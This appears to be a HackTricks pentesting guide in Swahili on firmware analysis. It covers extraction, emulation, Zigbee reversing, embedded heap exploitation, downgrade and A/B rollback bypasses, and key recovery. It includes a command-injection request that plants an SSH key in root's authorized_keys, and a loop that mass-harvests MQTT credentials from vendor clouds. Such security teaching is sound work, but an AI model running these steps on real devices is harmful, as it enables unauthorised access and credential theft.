# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Utangulizi**

### Rasilimali zinazohusiana


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni software muhimu inayowezesha vifaa kufanya kazi kwa usahihi kwa kudhibiti na kuwezesha mawasiliano kati ya vipengele vya hardware na software ambayo watumiaji huingiliana nayo. Huhifadhiwa kwenye memory ya kudumu, hivyo kuhakikisha kifaa kinaweza kufikia maelekezo muhimu tangu kinapowashwa, jambo linalosababisha mfumo wa uendeshaji kuanzishwa. Kuchunguza na, inapowezekana, kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa kiusalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali katika kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Muundo wa CPU na mfumo wa uendeshaji unaoendesha
- Maelezo ya bootloader
- Muundo wa hardware na datasheets
- Vipimo vya codebase na maeneo ya source
- External libraries na aina za leseni
- Historia za updates na certifications za kisheria
- Michoro ya architecture na flow
- Tathmini za usalama na vulnerabilities zilizotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, pamoja na uchambuzi wa vipengele vyovyote vya open-source software vinavyopatikana kupitia michakato ya ukaguzi wa manual na automated. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis bila malipo inayoweza kutumiwa kutafuta masuala yanayoweza kujitokeza.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- **Moja kwa moja** kutoka kwa chanzo (developers, manufacturers)
- **Kuijenga** kwa kutumia maelekezo yaliyotolewa
- **Kuipakua** kutoka kwenye tovuti rasmi za support
- Kutumia maswali ya **Google dork** kutafuta firmware files zilizohostiwa
- Kufikia **cloud storage** moja kwa moja, kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kukatiza **updates** kwa kutumia mbinu za man-in-the-middle
- **Ku-extract** kutoka kwenye kifaa kupitia connections kama **UART**, **JTAG**, au **PICit**
- **Kusniff** update requests ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Kudump** kutoka kwenye bootloader au network
- **Kuondoa na kusoma** storage chip, wakati mbinu nyingine zote zimeshindikana, kwa kutumia hardware tools zinazofaa

### UART-only logs: force a root shell via U-Boot env in flash

Ikiwa UART RX inapuuzwa (logs pekee), bado unaweza kulazimisha init shell kwa **kuhariri U-Boot environment blob** offline:<sup>[[6]](#references)</sup>

1. Dump SPI flash kwa SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Tambua U-Boot env partition, hariri `bootargs` ili kujumuisha `init=/bin/sh`, na **uhesabu upya U-Boot env CRC32** ya blob.
3. Flash tena env partition pekee na uwashe upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye embedded devices ambapo bootloader shell imezimwa lakini env partition inaweza kuandikwa kupitia external flash access.

## Kuchambua firmware

Sasa kwa kuwa **unayo firmware**, unahitaji ku-extract taarifa kuihusu ili kujua jinsi ya kuishughulikia. Kuna tools mbalimbali unazoweza kutumia kwa ajili hiyo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ikiwa huoni mengi kwa kutumia zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`. Ikiwa entropy ni ya chini, basi huenda haijasimbwa kwa njia fiche. Ikiwa entropy ni ya juu, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Aidha, unaweza kutumia zana hizi kutoa **files zilizopachikwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Kupata Mfumo wa Faili

Kwa kutumia zana zilizotajwa awali kama `binwalk -ev <bin>`, ulipaswa kuwa umeweza **kutoa mfumo wa faili**.\
Kwa kawaida Binwalk huitoa ndani ya **folder iliyopewa jina kulingana na aina ya mfumo wa faili**, ambayo kwa kawaida huwa mojawapo ya zifuatazo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Utoaji wa Mfumo wa Faili kwa Mwongozo

Wakati mwingine, binwalk **haitakuwa na magic byte ya mfumo wa faili katika signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya mfumo wa faili na kutoa mfumo wa faili uliobanwa** kutoka kwenye binary, kisha **utoe mfumo wa faili kwa mikono** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Tekeleza **dd command** ifuatayo ili kuchambua mfumo wa faili wa Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa kwenye directory ya "`squashfs-root`" baadaye.

- Faili za archive za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa filesystems za jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa filesystems za ubifs zenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchanganua Firmware

Baada ya firmware kupatikana, ni muhimu kuichanganua kwa kina ili kuelewa muundo wake na vulnerabilities zinazoweza kuwepo. Mchakato huu unahusisha kutumia tools mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye firmware image.

### Tools za Awali za UchanganuzI

Seti ya amri imetolewa kwa ukaguzi wa awali wa binary file (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua binary data, na kuelewa maelezo ya partition na filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Ili kutathmini hali ya usimbaji fiche ya image, **entropy** hukaguliwa kwa `binwalk -E <bin>`. Entropy ya chini huashiria ukosefu wa usimbaji fiche, huku entropy ya juu ikionyesha uwezekano wa usimbaji fiche au compression.

Kwa ajili ya kutoa **embedded files**, zana na rasilimali kama nyaraka za **file-data-carving-recovery-tools** pamoja na **binvis.io** kwa ukaguzi wa mafaili zinapendekezwa.

### Kutoa Filesystem

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa filesystem, mara nyingi kwenye directory iliyopewa jina kulingana na aina ya filesystem (kwa mfano, squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya filesystem kwa sababu ya magic bytes zilizokosekana, extraction ya manual inahitajika. Hii inahusisha kutumia `binwalk` kutafuta offset ya filesystem, kisha kutumia command ya `dd` ku-carve filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Baadaye, kulingana na aina ya filesystem (k.m., squashfs, cpio, jffs2, ubifs), commands tofauti hutumika kutoa yaliyomo manually.

### Uchambuzi wa Filesystem

Baada ya filesystem kutolewa, utafutaji wa security flaws huanza. Huangaliwa network daemons zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, API endpoints, utendaji wa update server, code ambayo haijacompile, startup scripts, na compiled binaries kwa ajili ya offline analysis.

**Maeneo muhimu** na **vitu** vya kukagua vinajumuisha:

- **etc/shadow** na **etc/passwd** kwa ajili ya user credentials
- SSL certificates na keys katika **etc/ssl**
- Configuration na script files kwa vulnerabilities zinazowezekana
- Embedded binaries kwa ajili ya analysis zaidi
- Web servers na binaries za kawaida za vifaa vya IoT

Tools kadhaa husaidia kugundua taarifa nyeti na vulnerabilities ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa static na dynamic analysis

### Ukaguzi wa Security kwenye Compiled Binaries

Source code na compiled binaries zote zinazopatikana kwenye filesystem lazima zichunguzwe kwa vulnerabilities. Tools kama **checksec.sh** kwa Unix binaries na **PESecurity** kwa Windows binaries husaidia kutambua binaries zisizolindwa ambazo zinaweza kutumiwa vibaya.

## Kukusanya cloud config na MQTT credentials kupitia derived URL tokens

IoT hubs nyingi hupata per-device configuration kutoka kwenye cloud endpoint inayoonekana kama:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa firmware analysis unaweza kugundua kwamba `<token>` inatokana locally na device ID kwa kutumia hardcoded secret, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) na kuwakilishwa kama uppercase hex

Muundo huu humwezesha mtu yeyote anayejua deviceId na STATIC_KEY kujenga upya URL na kuvuta cloud config, ambayo mara nyingi hufichua plaintext MQTT credentials na topic prefixes.

Practical workflow:

1) Toa deviceId kutoka kwenye UART boot logs

- Unganisha 3.3V UART adapter (TX/RX/GND) na capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tafuta mistari inayochapisha muundo wa URL ya cloud config na anwani ya broker, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Pata tena STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Tengeneza token katika Bash na ubadilishe digest iwe uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Kusanya cloud config na credentials za MQTT

- Unda URL na upakue JSON kwa curl; ichanganue kwa jq ili kutoa secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Tumia vibaya MQTT ya plaintext na topic ACLs dhaifu (ikiwa zipo)

- Tumia credentials zilizorejeshwa ku-subscribe kwenye maintenance topics na utafute matukio nyeti:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Hesabu device IDs zinazotabirika (kwa kiwango kikubwa, ukiwa na idhini)

- Mifumo mingi hujumuisha bytes za vendor OUI/product/type zikifuatiwa na suffix ya mfuatano.
- Unaweza kupitia candidate IDs, kuunda tokens na fetch configs programmatically:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Maelezo
- Daima pata idhini ya wazi kabla ya kujaribu mass enumeration.
- Pendelea emulation au static analysis ili kupata secrets bila kurekebisha target hardware inapowezekana.


Mchakato wa ku-emulate firmware huwezesha **dynamic analysis** ya uendeshaji wa kifaa au programu binafsi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au dependencies za architecture, lakini kuhamisha root filesystem au binaries maalum kwenye kifaa chenye architecture na endianness inayolingana, kama vile Raspberry Pi, au kwenye virtual machine iliyotengenezwa awali, kunaweza kuwezesha testing zaidi.

### Ku-emulate Individual Binaries

Kwa kuchunguza programu moja moja, ni muhimu kutambua endianness na CPU architecture ya programu.

#### Mfano wa MIPS Architecture

Ili ku-emulate binary ya MIPS architecture, unaweza kutumia command:
```bash
file ./squashfs-root/bin/busybox
```
Na kusakinisha zana muhimu za emulation:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Kwa MIPS (big-endian), `qemu-mips` hutumiwa, na kwa binaries za little-endian, `qemu-mipsel` ndiyo chaguo.

#### Uigaji wa ARM Architecture

Kwa binaries za ARM, mchakato ni sawa, huku emulator ya `qemu-arm` ikitumika kwa uigaji.

### Uigaji wa Mfumo Mzima

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo huwezesha uigaji kamili wa firmware, huendesha mchakato kiotomatiki na kusaidia katika dynamic analysis.

## Dynamic Analysis kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au kilichoigwa hutumika kwa analysis. Ni muhimu kudumisha ufikiaji wa shell kwenye OS na filesystem. Uigaji huenda usiige kikamilifu mwingiliano wa hardware, hivyo kuanzisha upya uigaji mara kwa mara kunaweza kuhitajika. Analysis inapaswa kuchunguza tena filesystem, kutumia vibaya webpages na network services zilizo wazi, na kuchunguza udhaifu wa bootloader. Majaribio ya integrity ya firmware ni muhimu ili kutambua udhaifu unaoweza kusababishwa na backdoor.

## Mbinu za Runtime Analysis

Runtime analysis huhusisha kuingiliana na process au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kutambua udhaifu kupitia fuzzing na mbinu nyingine.

Kwa embedded targets zisizo na debugger kamili, **copy a statically-linked `gdbserver`** kwenye kifaa na uiambatishe remotely:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / mapping ya ujumbe wa radio co-processor

Kwenye IoT hubs, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Workflow muhimu ni kufuatilia njia:<sup>[[8]](#references)</sup>

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Usanifu huu huunda targets mbili za reversing badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa textual protocol kama `Group,Command,arg1,arg2,...`, bainisha:

- **message groups** na dispatch tables
- Ni ujumbe upi unaweza kutoka kwenye **network** dhidi ya controller yenyewe
- **manufacturer-specific discriminator fields** kamili (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinapatikana tu wakati wa **commissioning**, discovery, au firmware/model download phases

Kwa Zigbee hasa, capture pairing traffic na uangalie ikiwa target bado inategemea default **Link Key** `ZigBeeAlliance09`. Ikiwa ndivyo, sniffing commissioning traffic inaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza exposure hii, kwa hiyo bainisha ikiwa kifaa kilichojaribiwa kinazitekeleza kwa kweli.

### Manufacturer-specific protocol handlers na FSM-gated reachability

Vendor-specific Zigbee/ZCL commands mara nyingi huwa target bora kuliko standardized clusters kwa sababu hupeleka data kwenye **custom parsing code** na internal **FSMs** zenye validation iliyojaribiwa kidogo.<sup>[[8]](#references)</sup>

Workflow ya vitendo:

- Reverse command dispatcher hadi upate **vendor-only handler**.
- Rejesha **FSM state**, **event**, **check**, **action**, na **next-state** tables.
- Tambua **transitional states** zinazoendelea kiotomatiki na retry/error branches ambazo hatimaye hu-reset au ku-free attacker-controlled state.
- Thibitisha ni protocol exchanges zipi halali zinazohitajika kuiweka daemon kwenye state iliyo vulnerable, badala ya kudhani kuwa buggy handler inapatikana kila wakati.

Kwa protocols zinazotegemea timing, packet replay kutoka Python framework inaweza kuwa polepole sana. Njia inayotegemewa zaidi ni ku-emulate kifaa halali kwenye real hardware (kwa mfano **nRF52840**) kwa vendor-grade stack ili uweze kuonyesha **endpoints**, **attributes**, na commissioning timing sahihi.

### Fragmented-download bug class katika embedded daemons

Aina ya firmware bug inayojirudia huonekana katika **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. **First fragment** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga `malloc(total_size)`.
2. Fragments zinazofuata huthibitisha tu fields zinazodhibitiwa na attacker za **packet-local**, kama `packet_total_size >= offset + chunk_len`.
3. Copy hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kuangalia dhidi ya **original allocated size**.

Hii humwezesha attacker kutuma:

- First valid fragment yenye declared total size **ndogo** ili kulazimisha small heap allocation.
- Fragment inayofuata yenye **expected offset** lakini `chunk_len` kubwa zaidi.
- Forged packet-local size inayokidhi fresh checks huku iki-overflow buffer iliyotengwa awali.

Wakati vulnerable path iko nyuma ya commissioning logic, exploitation lazima ijumuishwe na **device emulation** ya kutosha kuiendesha target hadi kwenye expected model-download au blob-download state kabla ya kutuma malformed fragments.

### Protocol-driven `free()` triggers

Katika embedded daemons, njia rahisi zaidi ya ku-trigger heap metadata exploitation mara nyingi si "kusubiri cleanup", bali **kulazimisha error handling ya protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma malformed follow-up fragments ili kusukuma FSM kwenye **retry** au **error** states.
- Vuka retry threshold ili daemon **ireset context** na i-free corrupted buffer.
- Tumia `free()` hii inayotabirika ku-trigger allocator-side primitives kabla process haija-crash kwa sababu zisizohusiana.

Hii ni muhimu hasa dhidi ya **musl/uClibc/dlmalloc-like** allocators kwenye embedded Linux, ambapo ku-corrupt chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa write primitive. Pattern thabiti ni ku-corrupt **size field** ili kuelekeza allocator traversal kwenye **fake chunks** zilizowekwa ndani ya overflowed buffer, badala ya ku-overwrite mara moja real bin pointers na ku-crash process.

## Binary Exploitation and Proof-of-Concept

Kutengeneza PoC kwa vulnerabilities zilizotambuliwa kunahitaji uelewa wa kina wa target architecture na programming katika lugha za lower-level. Binary runtime protections kwenye embedded systems ni nadra, lakini zinapokuwepo, techniques kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na glibc. Large allocation ya baadaye inaweza ku-trigger `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite checks (size inayofaa, `fd = 0`, na surrounding chunks zionekane kuwa "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ikiwa ASLR imewezeshwa lakini main binary ni **non-PIE**, addresses za `.data/.bss` ndani ya binary huwa stable. Unaweza kulenga region ambayo tayari inafanana na valid heap chunk header ili ku-land fastbin allocation kwenye **function pointer table**.
- **Parser-stopping NUL:** JSON inapoparsiwa, `\x00` kwenye payload inaweza kusimamisha parsing huku ikihifadhi trailing attacker-controlled bytes kwa stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain inayokiita `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kupandikiza executable shellcode kwenye known mapping na ku-jump humo.

## Prepared Operating Systems for Firmware Analysis

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa environments zilizosanidiwa awali kwa firmware security testing, zikiwa na tools muhimu.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya security assessment na penetration testing ya Internet of Things (IoT) devices. Huokoa muda mwingi kwa kutoa environment iliyosanidiwa awali yenye tools zote muhimu zilizopakiwa.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system inayotegemea Ubuntu 18.04 na iliyopakiwa awali na firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Hata vendor anapotekeleza cryptographic signature checks kwa firmware images, **version rollback (downgrade) protection mara nyingi huachwa**. Boot- au recovery-loader inapothibitisha signature tu kwa kutumia embedded public key lakini hailinganisha *version* (au monotonic counter) ya image inayoflashwa, attacker anaweza kusakinisha kihalali **older, vulnerable firmware ambayo bado ina valid signature** na hivyo kurudisha patched vulnerabilities.<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **Obtain an older signed image**
* Ipakue kutoka vendor’s public download portal, CDN au support site.
* I-extract kutoka companion mobile/desktop applications (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
* I-retrieve kutoka third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Upload or serve the image to the device** kupitia exposed update channel yoyote:
* Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
* Consumer IoT devices nyingi huonyesha *unauthenticated* HTTP(S) endpoints zinazokubali firmware blobs zilizo-encode kwa Base64, huzidecode server-side na ku-trigger recovery/upgrade.
3. Baada ya downgrade, exploit vulnerability iliyopatched kwenye newer release (kwa mfano command-injection filter iliyoongezwa baadaye).
4. Kwa hiari, flash latest image tena au disable updates ili kuepuka detection baada ya persistence kupatikana.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyo hatarini (iliyodowngrade), parameter ya `md5` inaunganishwa moja kwa moja kwenye shell command bila sanitisation, hivyo kuruhusu injection ya commands kiholela (hapa – kuwezesha root access kwa kutumia SSH key). Toleo za baadaye za firmware zilianzisha character filter ya msingi, lakini kutokuwepo kwa ulinzi dhidi ya downgrade kunafanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka Kwenye Mobile Apps

Vendor wengi hujumuisha firmware images kamili ndani ya companion mobile applications ili app iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Packages hizi kwa kawaida huhifadhiwa bila encryption ndani ya APK/APEX, chini ya paths kama `assets/fw/` au `res/raw/`. Tools kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuruhusu kutoa signed images bila kugusa hardware halisi.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass ya anti-rollback inayotegemea updater pekee katika miundo ya A/B slot

Baadhi ya vendors hutekeleza **ratchet** ya anti-downgrade, lakini ndani ya mantiki ya *updater* pekee (kwa mfano routine ya UDS kupitia CAN, amri ya recovery, au OTA agent ya userspace). Ikiwa **bootloader** baadaye hukagua tu image signature/CRC na kuamini partition table au slot metadata, ulinzi wa rollback bado unaweza kubypass.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Firmware metadata ina version descriptor pamoja na **security ratchet** / monotonic counter.
- Updater hulinganisha image ratchet na thamani iliyohifadhiwa kwenye persistent storage na kukataa signed images za zamani.
- **Bootloader** haiparsi ratchet hiyo na huthibitisha tu header, CRC, na signature kabla ya ku-boot slot iliyochaguliwa.
- Slot activation huhifadhiwa kando katika partition table au per-slot generation counter na **haijaunganishwa cryptographically** na firmware digest halisi iliyothibitishwa.

Hii huunda primitive ya **validate-one-image / boot-another-image** katika mifumo ya dual-slot. Ikiwa attacker anaweza kufanya updater iweke slot B kama lengo la boot inayofuata kwa kutumia signed image ya sasa, na baadaye kuandika upya slot B kabla ya reboot, bootloader bado inaweza ku-boot image iliyodowngrade kwa sababu huamini tu slot metadata iliyokwisha-commit.

Muundo wa kawaida wa abuse:

1. Upload **current signed** firmware kwenye passive slot na uendeshe validation/switch routine ya kawaida ili layout iweke slot hiyo kuwa active inayofuata.
2. **Usifanye reboot bado**. Ingia tena kwenye slot-preparation/erase routine katika session hiyo hiyo.
3. Tumia vibaya stale boot-state au stale slot-selection logic ili updater ifute **physical slot ileile** iliyopandishwa hivi karibuni.
4. Andika **older but still signed** firmware kwenye slot hiyo.
5. Ruka validation routine inayotekeleza ratchet na ufanye reboot moja kwa moja.
6. Bootloader huchagua slot iliyopandishwa, huthibitisha signature/integrity pekee, na ku-boot image ya zamani.

Mambo ya kutafuta unapofanya reverse engineering ya utekelezaji wa A/B update:

- Slot selection inayotokana na **boot-time flags** ambazo hazirefreshwi baada ya switch iliyofanikiwa.
- Routine ya mtindo wa `prepare_passive_slot()` inayofuta slot kwa kutegemea stale state badala ya **current committed layout**.
- Function ya mtindo wa `part_write_layout()` inayoongeza tu **generation counter** / active flag na haihifadhi validated image hash.
- Ratchet checks zinazotekelezwa kwenye userspace au updater code, lakini **hazipo** katika ROM / bootloader / secure boot stages.
- Erase au recovery routines zinazoacha slot ikiwa imetiwa alama kuwa bootable hata baada ya maudhui yake kuondolewa na kuandikwa upya.

### Checklist ya Kutathmini Update Logic

* Je, transport/authentication ya *update endpoint* imelindwa vya kutosha (TLS + authentication)?
* Je, device inalinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya flashing?
* Je, image inathibitishwa ndani ya secure boot chain (kwa mfano signatures hukaguliwa na ROM code)?
* Je, **bootloader inatekeleza ratchet hiyo hiyo** kama updater, badala ya kuangalia signature/CRC pekee?
* Je, slot activation metadata **imefungwa kwenye validated firmware digest/version**, au slot inaweza kurekebishwa baada ya promotion?
* Baada ya slot switch kufanikiwa, je device inalazimishwa kufanya reboot au update/erase routines zinazofuata bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, userland code hufanya sanity checks za ziada (kwa mfano allowed partition map, model number)?
* Je, *partial* au *backup* update flows zinatumia tena validation logic ileile?

> 💡 Ikiwa lolote kati ya yaliyo hapo juu halipo, platform huenda iko vulnerable kwa rollback attacks.

## Vulnerable firmware to practice

Ili kufanya mazoezi ya kugundua vulnerabilities katika firmware, tumia vulnerable firmware projects zifuatazo kama mwanzo.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recovering firmware decryption keys from embedded KMS/Vault state

Wakati update image inachanganya plaintext metadata ndogo na blob kubwa yenye high entropy, fanya container triage kabla ya kujaribu brute-force yoyote:<sup>[[1]](#references)</sup>

- Dump headers, offsets na line boundaries kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida humaanisha OpenSSL `enc` format: bytes 8 zinazofuata ni salt na bytes zilizosalia ni ciphertext.
- Base64 field inayodecode kuwa `256` bytes kamili ni dalili thabiti kwamba unaangalia RSA-2048 ciphertext inayofunga random firmware password/session key.
- Detached PGP material katika file hilo hilo mara nyingi hulinda authenticity pekee; usidhani kwamba ndiyo confidentiality mechanism.

Ikiwa static key hunting (`grep`, `strings`, PEM/PGP searches) haitafaulu, fanya reverse engineering ya **operational decrypt path** badala ya kutafuta private keys pekee:

- Decompile updater / management binary na ufuatilie ni nani anayesoma encrypted blob, ni helper/API gani inayo-unwap, na logical key name gani inayoiomba.
- Tafuta KMS state katika extracted root filesystem (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts.
- Chukulia plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens, au local KMS auto-unseal scripts kuwa sawa na private-key material.

